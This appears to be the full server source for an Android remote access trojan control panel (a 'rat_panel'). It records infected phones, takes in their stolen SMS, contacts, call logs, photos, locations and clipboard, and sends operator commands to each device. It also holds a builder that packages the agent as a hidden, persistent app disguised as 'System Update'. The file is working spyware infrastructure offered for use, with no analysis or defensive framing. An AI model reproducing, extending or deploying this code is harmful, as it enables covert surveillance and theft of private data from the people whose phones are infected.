const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const morgan = require('morgan');
const fs = require('fs');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs'); 
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] }
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ extended: true, limit: '500mb' }));
app.use(morgan('dev'));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/rat_panel', {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log('MongoDB Connected'))
  .catch(err => console.log('MongoDB Error:', err));

// Device Schema
const DeviceSchema = new mongoose.Schema({
  deviceId: { type: String, unique: true, required: true },
  alias: String,
  status: { type: String, default: 'offline', enum: ['online', 'offline', 'sleeping'] },
  ip: String,
  country: String,
  city: String,
  isp: String,
  os: String,
  osVersion: String,
  deviceModel: String,
  manufacturer: String,
  batteryLevel: Number,
  isCharging: Boolean,
  lastSeen: { type: Date, default: Date.now },
  firstSeen: { type: Date, default: Date.now },
  permissions: {
    camera: Boolean,
    location: Boolean,
    sms: Boolean,
    contacts: Boolean,
    storage: Boolean,
    microphone: Boolean,
    phone: Boolean,
    notifications: Boolean
  },
  apkVersion: String,
  isHidden: { type: Boolean, default: false },
  hiddenAt: Date,
  commands: [{
    commandId: String,
    type: String,
    params: Object,
    status: { type: String, default: 'pending', enum: ['pending', 'sent', 'delivered', 'executed', 'failed'] },
    result: Object,
    createdAt: { type: Date, default: Date.now },
    executedAt: Date
  }],
  data: {
    contacts: Array,
    sms: Array,
    callLogs: Array,
    photos: Array,
    videos: Array,
    documents: Array,
    locations: [{
      lat: Number,
      lng: Number,
      accuracy: Number,
      timestamp: Date,
      address: String
    }],
    installedApps: Array,
    accounts: Array,
    clipboard: String,
    notifications: Array,
    wifiNetworks: Array,
    deviceInfo: Object
  }
}, { timestamps: true });

const Device = mongoose.model('Device', DeviceSchema);

// Admin Schema
const AdminSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  email: String,
  apiKey: String,
  twoFactorSecret: String,
  isTwoFactorEnabled: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});

const Admin = mongoose.model('Admin', AdminSchema);

// APK Build Schema
const ApkBuildSchema = new mongoose.Schema({
  buildId: { type: String, unique: true },
  name: String,
  packageName: String,
  icon: String,
  version: String,
  bindWithApk: String,
  serverUrl: String,
  wsUrl: String,
  hideAfterInstall: { type: Boolean, default: false },
  hideLauncher: { type: Boolean, default: true },
  persistence: { type: Boolean, default: true },
  adminFeatures: {
    camera: { type: Boolean, default: true },
    microphone: { type: Boolean, default: true },
    location: { type: Boolean, default: true },
    sms: { type: Boolean, default: true },
    calls: { type: Boolean, default: true },
    contacts: { type: Boolean, default: true },
    storage: { type: Boolean, default: true },
    notifications: { type: Boolean, default: true }
  },
  createdAt: { type: Date, default: Date.now },
  downloads: { type: Number, default: 0 }
});

const ApkBuild = mongoose.model('ApkBuild', ApkBuildSchema);

// Authentication Middleware
const authMiddleware = async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'rat_secret_key_2024');
    req.adminId = decoded.id;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
};

// Socket.IO - Device Communication
io.use(async (socket, next) => {
  const { deviceId, type } = socket.handshake.query;
  if (type === 'device') {
    socket.deviceId = deviceId;
    return next();
  }
  const token = socket.handshake.auth.token;
  if (token) {
    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET || 'rat_secret_key_2024');
      socket.adminId = decoded.id;
      return next();
    } catch (err) {
      return next(new Error('Authentication error'));
    }
  }
  next();
});

io.on('connection', async (socket) => {
  console.log('New connection:', socket.id);

  // Device connection
  if (socket.deviceId) {
    try {
      const device = await Device.findOneAndUpdate(
        { deviceId: socket.deviceId },
        { 
          status: 'online', 
          lastSeen: new Date(),
          ip: socket.handshake.address,
          $inc: { 'stats.connections': 1 }
        },
        { upsert: true, new: true }
      );
      
      socket.join(`device:${socket.deviceId}`);
      
      // Notify admin panels
      io.emit('device:online', { deviceId: socket.deviceId, device });
      
      // Send pending commands
      const pendingCommands = device.commands.filter(c => c.status === 'pending');
      pendingCommands.forEach(cmd => {
        socket.emit('command', cmd);
      });

      socket.on('device:update', async (data) => {
        try {
          await Device.findOneAndUpdate(
            { deviceId: socket.deviceId },
            { 
              ...data,
              lastSeen: new Date(),
              status: 'online'
            }
          );
          io.emit('device:data', { deviceId: socket.deviceId, data });
        } catch (err) {
          console.error('Update error:', err);
        }
      });

      socket.on('device:result', async (data) => {
        try {
          const { commandId, result, status } = data;
          await Device.findOneAndUpdate(
            { deviceId: socket.deviceId, 'commands.commandId': commandId },
            { 
              'commands.$.status': status || 'executed',
              'commands.$.result': result,
              'commands.$.executedAt': new Date()
            }
          );
          io.emit(`command:result:${commandId}`, { deviceId: socket.deviceId, result, status });
        } catch (err) {
          console.error('Result error:', err);
        }
      });

      socket.on('device:data:bulk', async (data) => {
        try {
          const updateFields = {};
          if (data.contacts) updateFields['data.contacts'] = data.contacts;
          if (data.sms) updateFields['data.sms'] = data.sms;
          if (data.callLogs) updateFields['data.callLogs'] = data.callLogs;
          if (data.photos) updateFields['data.photos'] = data.photos;
          if (data.location) {
            updateFields['$push'] = { 'data.locations': {
              ...data.location,
              timestamp: new Date()
            }};
          }
          if (data.installedApps) updateFields['data.installedApps'] = data.installedApps;
          if (data.deviceInfo) updateFields['data.deviceInfo'] = data.deviceInfo;
          
          await Device.findOneAndUpdate(
            { deviceId: socket.deviceId },
            updateFields,
            { new: true }
          );
          
          io.emit('device:data:update', { deviceId: socket.deviceId, data });
        } catch (err) {
          console.error('Bulk data error:', err);
        }
      });

      socket.on('disconnect', async () => {
        await Device.findOneAndUpdate(
          { deviceId: socket.deviceId },
          { status: 'offline', lastSeen: new Date() }
        );
        io.emit('device:offline', { deviceId: socket.deviceId });
      });

      socket.on('device:ping', async () => {
        await Device.findOneAndUpdate(
          { deviceId: socket.deviceId },
          { lastSeen: new Date(), status: 'online' }
        );
        socket.emit('device:pong');
      });

    } catch (err) {
      console.error('Device connection error:', err);
    }
  }

  // Admin panel connection
  if (socket.adminId) {
    socket.join('admin');
    
    socket.on('command:send', async (data) => {
      try {
        const { deviceId, type, params } = data;
        const commandId = require('uuid').v4();
        
        await Device.findOneAndUpdate(
          { deviceId },
          { 
            $push: { 
              commands: {
                commandId,
                type,
                params,
                status: 'pending',
                createdAt: new Date()
              }
            }
          }
        );
        
        io.to(`device:${deviceId}`).emit('command', { commandId, type, params });
        
        socket.emit('command:sent', { commandId, deviceId, type });
      } catch (err) {
        socket.emit('command:error', { error: err.message });
      }
    });

    socket.on('command:send:immediate', async (data) => {
      try {
        const { deviceId, type, params } = data;
        io.to(`device:${deviceId}`).emit('command', { 
          commandId: 'immediate_' + Date.now(), 
          type, 
          params,
          immediate: true
        });
      } catch (err) {
        socket.emit('command:error', { error: err.message });
      }
    });
  }
});

// === REST API Routes ===

// Auth Routes
app.post('/api/auth/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    const admin = await Admin.findOne({ username });
    if (!admin) return res.status(401).json({ error: 'Invalid credentials' });
    
    const isMatch = await bcrypt.compare(password, admin.password);
    if (!isMatch) return res.status(401).json({ error: 'Invalid credentials' });
    
    const token = jwt.sign({ id: admin._id }, process.env.JWT_SECRET || 'rat_secret_key_2024', { expiresIn: '7d' });
    res.json({ token, admin: { username: admin.username, email: admin.email } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, password, email } = req.body;
    const hashedPassword = await bcrypt.hash(password, 12);
    const admin = new Admin({ username, password: hashedPassword, email, apiKey: uuidv4() });
    await admin.save();
    const token = jwt.sign({ id: admin._id }, process.env.JWT_SECRET || 'rat_secret_key_2024', { expiresIn: '7d' });
    res.json({ token, admin: { username: admin.username, email: admin.email } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Devices Routes
app.get('/api/devices', authMiddleware, async (req, res) => {
  try {
    const devices = await Device.find().sort({ lastSeen: -1 });
    res.json(devices);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
  try {
    const device = await Device.findOne({ deviceId: req.params.deviceId });
    if (!device) return res.status(404).json({ error: 'Device not found' });
    res.json(device);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/devices/:deviceId/command', authMiddleware, async (req, res) => {
  try {
    const { type, params } = req.body;
    const device = await Device.findOne({ deviceId: req.params.deviceId });
    if (!device) return res.status(404).json({ error: 'Device not found' });
    
    const commandId = uuidv4();
    device.commands.push({
      commandId,
      type,
      params,
      status: 'pending',
      createdAt: new Date()
    });
    await device.save();
    
    io.to(`device:${req.params.deviceId}`).emit('command', { commandId, type, params });
    
    res.json({ commandId, status: 'pending' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// // APK Builder Module
// const apkBuilder = require('./apk-builder');

// // APK Build Routes
// app.post('/api/apk/build', authMiddleware, async (req, res) => {
//   try {
//     const buildData = req.body;
//     const buildId = uuidv4();
//     const build = new ApkBuild({
//       buildId,
//       ...buildData,
//       serverUrl: buildData.serverUrl || process.env.SERVER_URL || 'http://localhost:5000',
//       wsUrl: buildData.wsUrl || process.env.WS_URL || 'http://localhost:5000',
//       createdAt: new Date()
//     });
//     await build.save();

//     // Start APK build asynchronously
//     res.json({ 
//       buildId, 
//       message: 'Build started', 
//       status: 'building',
//       buildUrl: buildData.serverUrl || process.env.SERVER_URL
//     });

//     // Run build in background
//     setTimeout(async () => {
//       try {
//         console.log(`[Server] Building APK for build ${buildId}...`);
//         const result = await apkBuilder.buildAPK({
//           buildId,
//           name: buildData.name || 'System Update',
//           packageName: buildData.packageName || 'com.android.system.update',
//           version: buildData.version || '1.0.0',
//           serverUrl: buildData.serverUrl || process.env.SERVER_URL || 'http://localhost:5000',
//           wsUrl: buildData.wsUrl || process.env.WS_URL || 'http://localhost:5000'
//         });

//         // Update build record with download info
//         await ApkBuild.findOneAndUpdate(
//           { buildId },
//           { 
//             $set: { 
//               status: result.success ? 'ready' : 'failed',
//               buildPath: result.path,
//               buildMethod: result.method,
//               downloadUrls: apkBuilder.getApkDownloadUrl(buildId),
//               message: result.message || 'APK ready for download'
//             },
//             $inc: { downloads: 0 }
//           }
//         );
//         console.log(`[Server] Build ${buildId} completed:`, result.success ? 'SUCCESS' : 'FAILED');
//       } catch (err) {
//         console.error(`[Server] Build ${buildId} error:`, err.message);
//         await ApkBuild.findOneAndUpdate(
//           { buildId },
//           { $set: { status: 'failed', error: err.message } }
//         );
//       }
//     }, 100);
//   } catch (err) {
//     res.status(500).json({ error: err.message });
//   }
// });

// app.get('/api/apk/builds', authMiddleware, async (req, res) => {
//   try {
//     const builds = await ApkBuild.find().sort({ createdAt: -1 });
//     res.json(builds);
//   } catch (err) {
//     res.status(500).json({ error: err.message });
//   }
// });

// // APK Download Route
// app.get('/api/apk/download/:filename', authMiddleware, (req, res) => {
//   const filePath = path.join(__dirname, 'builds', 'apks', req.params.filename);
  
//   // Security: only allow .apk and .zip files
//   if (!req.params.filename.endsWith('.apk') && !req.params.filename.endsWith('.zip')) {
//     return res.status(400).json({ error: 'Invalid file type' });
//   }

//   if (!fs.existsSync(filePath)) {
//     return res.status(404).json({ error: 'File not found' });
//   }

//   res.download(filePath);
// });

// // Build Status Check
// app.get('/api/apk/status/:buildId', authMiddleware, async (req, res) => {
//   try {
//     const build = await ApkBuild.findOne({ buildId: req.params.buildId });
//     if (!build) return res.status(404).json({ error: 'Build not found' });

//     const downloadUrls = apkBuilder.getApkDownloadUrl(req.params.buildId);
    
//     res.json({
//       buildId: build.buildId,
//       status: build.status || 'unknown',
//       name: build.name,
//       version: build.version,
//       downloadUrls,
//       message: build.message || '',
//       error: build.error || '',
//       createdAt: build.createdAt
//     });
//   } catch (err) {
//     res.status(500).json({ error: err.message });
//   }
// });

// ============================================
// APK Builder Module - Generates build scripts
// ============================================

const APK_TEMPLATE_DIR = path.join(__dirname, '..', 'android-agent');

// Generate build script for local APK building
function generateBuildScript(build) {
  const androidAgentPath = path.resolve(__dirname, '..', 'android-agent');
  const appName = build.name || 'System Update';
  const pkgName = build.packageName || 'com.android.system.update';
  const buildId = build.buildId;
  const serverUrl = build.serverUrl || 'http://localhost:5000';
  const wsUrl = build.wsUrl || 'http://localhost:5000';
  
  return `#!/bin/bash
# ========================================
# APK Builder Script
# App: ${appName}
# Package: ${pkgName}
# Build ID: ${buildId}
# Server URL: ${serverUrl}
# ========================================

set -e

RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
NC='\\033[0m'

echo -e "\${GREEN}[*] Building APK: ${appName}\${NC}"

# Check Android SDK
if [ -z "\$ANDROID_HOME" ] && [ -z "\$ANDROID_SDK_ROOT" ]; then
    echo -e "\${RED}[!] ANDROID_HOME not set\${NC}"
    echo "Set it: export ANDROID_HOME=/path/to/android/sdk"
    exit 1
fi

echo -e "\${GREEN}[✓] Android SDK found\${NC}"

# Navigate to android-agent directory
SCRIPT_DIR="\$(cd "\$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
cd "\${SCRIPT_DIR}/android-agent"

if [ ! -f "gradlew" ]; then
    echo -e "\${RED}[!] android-agent directory not found at: \$(pwd)\${NC}"
    echo -e "\${YELLOW}Please ensure android-agent/ is in the same directory as this script\${NC}"
    exit 1
fi

# Update strings.xml with server URLs
STRINGS_FILE="app/src/main/res/values/strings.xml"
if [ -f "\$STRINGS_FILE" ]; then
    echo -e "\${YELLOW}[*] Updating server URLs...\${NC}"
    # Replace server_url in strings.xml
    if [[ "\$OSTYPE" == "darwin"* ]]; then
        sed -i '' 's|<string name="server_url".*</string>|<string name="server_url" translatable="false">${serverUrl}</string>|g' "\$STRINGS_FILE"
        sed -i '' 's|<string name="ws_url".*</string>|<string name="ws_url" translatable="false">${wsUrl}</string>|g' "\$STRINGS_FILE"
    else
        sed -i 's|<string name="server_url".*</string>|<string name="server_url" translatable="false">${serverUrl}</string>|g' "\$STRINGS_FILE"
        sed -i 's|<string name="ws_url".*</string>|<string name="ws_url" translatable="false">${wsUrl}</string>|g' "\$STRINGS_FILE"
    fi
    echo -e "\${GREEN}[✓] Server URLs updated\${NC}"
fi

# Make gradlew executable
chmod +x gradlew

# Clean and build
echo -e "\${YELLOW}[*] Building APK (this may take a few minutes)...\${NC}"
./gradlew clean assembleDebug

# Check if build succeeded
APK_PATH="app/build/outputs/apk/debug/app-debug.apk"
if [ -f "\$APK_PATH" ]; then
    echo ""
    echo -e "\${GREEN}========================================"
    echo "  BUILD SUCCESSFUL!"
    echo "========================================\${NC}"
    echo ""
    echo "  APK Location: \$(pwd)/\$APK_PATH"
    echo "  Size: \$(ls -lh "\$APK_PATH" | awk '{print \$5}')"
    echo ""
    echo "  Install on device:"
    echo "  adb install \$APK_PATH"
    echo ""
else
    echo ""
    echo -e "\${RED}========================================"
    echo "  BUILD FAILED"
    echo "========================================\${NC}"
    echo ""
    echo "  Check the error above or run:"
    echo "  ./gradlew assembleDebug --stacktrace"
    echo ""
    exit 1
fi
`;
}

// APK Build Routes
app.post('/api/apk/build', authMiddleware, async (req, res) => {
  try {
    const buildData = req.body;
    const buildId = uuidv4();
    
    const build = new ApkBuild({
      buildId,
      ...buildData,
      serverUrl: buildData.serverUrl || process.env.SERVER_URL || 'http://localhost:5000',
      wsUrl: buildData.wsUrl || process.env.WS_URL || 'http://localhost:5000',
      status: 'configured',
      createdAt: new Date()
    });
    await build.save();

    // Generate build script
    const buildScript = generateBuildScript(build);
    
    // Save build script to server
    const buildDir = path.join(__dirname, 'builds', 'scripts');
    if (!fs.existsSync(buildDir)) {
      fs.mkdirSync(buildDir, { recursive: true });
    }
    fs.writeFileSync(
      path.join(buildDir, `build_${buildId}.sh`),
      buildScript
    );

    res.json({ 
      buildId, 
      message: 'Build configuration saved. To build the APK, run the generated script on a machine with Android SDK.',
      status: 'configured',
      buildScript: `build_${buildId}.sh`,
      note: 'The APK cannot be built on the server. Download the build script and run it on a machine with Android Studio/SDK installed.'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/apk/builds', authMiddleware, async (req, res) => {
  try {
    const builds = await ApkBuild.find().sort({ createdAt: -1 });
    res.json(builds);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Build Status Check
app.get('/api/apk/status/:buildId', authMiddleware, async (req, res) => {
  try {
    const build = await ApkBuild.findOne({ buildId: req.params.buildId });
    if (!build) return res.status(404).json({ error: 'Build not found' });

    res.json({
      buildId: build.buildId,
      status: build.status || 'configured',
      name: build.name,
      version: build.version,
      packageName: build.packageName,
      serverUrl: build.serverUrl,
      message: build.status === 'configured' ? 'Build configured. Run the build script to generate APK.' : '',
      createdAt: build.createdAt
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Download build script
app.get('/api/apk/script/:buildId', authMiddleware, async (req, res) => {
  try {
    const build = await ApkBuild.findOne({ buildId: req.params.buildId });
    if (!build) return res.status(404).json({ error: 'Build not found' });
    
    const scriptPath = path.join(__dirname, 'builds', 'scripts', `build_${build.buildId}.sh`);
    
    if (!fs.existsSync(scriptPath)) {
      // Regenerate script
      const buildScript = generateBuildScript(build);
      const buildDir = path.join(__dirname, 'builds', 'scripts');
      if (!fs.existsSync(buildDir)) {
        fs.mkdirSync(buildDir, { recursive: true });
      }
      fs.writeFileSync(scriptPath, buildScript);
    }
    
    res.download(scriptPath, `build_apk_${build.name?.replace(/\s+/g, '_') || 'app'}.sh`);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Stats Routes
app.get('/api/stats', authMiddleware, async (req, res) => {
  try {
    const totalDevices = await Device.countDocuments();
    const onlineDevices = await Device.countDocuments({ status: 'online' });
    const todayNew = await Device.countDocuments({
      firstSeen: { $gte: new Date(new Date().setHours(0,0,0,0)) }
    });
    const totalCommands = await Device.aggregate([
      { $project: { cmdCount: { $size: { $ifNull: ['$commands', []] } } } },
      { $group: { _id: null, total: { $sum: '$cmdCount' } } }
    ]);
    
    res.json({
      totalDevices,
      onlineDevices,
      todayNew,
      totalCommands: totalCommands[0]?.total || 0
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res) => {
  try {
    const { deviceId, dataType } = req.params;
    const device = await Device.findOne({ deviceId });
    if (!device) return res.status(404).json({ error: 'Device not found' });
    
    const validTypes = ['contacts', 'sms', 'callLogs', 'photos', 'videos', 'documents', 'locations', 'installedApps'];
    if (!validTypes.includes(dataType)) {
      return res.status(400).json({ error: 'Invalid data type' });
    }
    
    res.json(device.data[dataType] || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`WebSocket server ready`);
});